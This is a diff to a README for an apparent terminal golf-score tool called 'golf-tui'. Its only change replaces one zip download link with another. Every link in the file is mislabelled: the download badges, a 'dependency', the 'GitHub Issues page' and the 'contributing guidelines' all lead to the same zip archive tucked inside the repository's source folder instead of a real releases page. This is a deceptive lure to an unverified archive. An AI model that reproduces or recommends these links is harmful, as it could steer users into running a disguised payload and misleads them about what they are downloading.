@@ -8,7 +8,7 @@ Welcome to golf-tui! This is a terminal user interface that shows live professio
 
 To get started with golf-tui, you will need to download the software from our releases page. Click the link below to go directly to the download:
 
-[![Download golf-tui](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip)](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip)
+[![Download golf-tui](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip)](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip)
 
 1. **Click the link above.**
 2. Find the latest version at the top of the releases page.
@@ -56,7 +56,7 @@ Before installing, ensure your system meets the following requirements:
   - Any modern Linux distribution
 
 - **Dependencies:**
-  - https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip (version 14 or higher)
+  - https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip (version 14 or higher)
   - Internet connection for live updates
 
 ## 📘 How to Use
@@ -72,11 +72,11 @@ We regularly release updates to improve functionality and user experience. After
 
 ## 🆘 Support
 
-If you have questions or run into issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip) to report them. You can also find helpful solutions from our community.
+If you have questions or run into issues, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip) to report them. You can also find helpful solutions from our community.
 
 ## 🌐 Contributing
 
-We welcome contributions! If you want to help improve golf-tui, check out our [contributing guidelines](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip).
+We welcome contributions! If you want to help improve golf-tui, check out our [contributing guidelines](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip).
 
 ## ✉️ Contact
 
@@ -84,4 +84,4 @@ For any inquiries, please reach out to the project maintainer by opening an issu
 
 Don't forget to visit the download page again for updates or new features!
 
-[![Download golf-tui](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip)](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/api/golf-tui-3.6.zip)
+[![Download golf-tui](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip)](https://raw.githubusercontent.com/Djibrilfall2109/golf-tui/main/src/components/golf_tui_v3.7.zip)
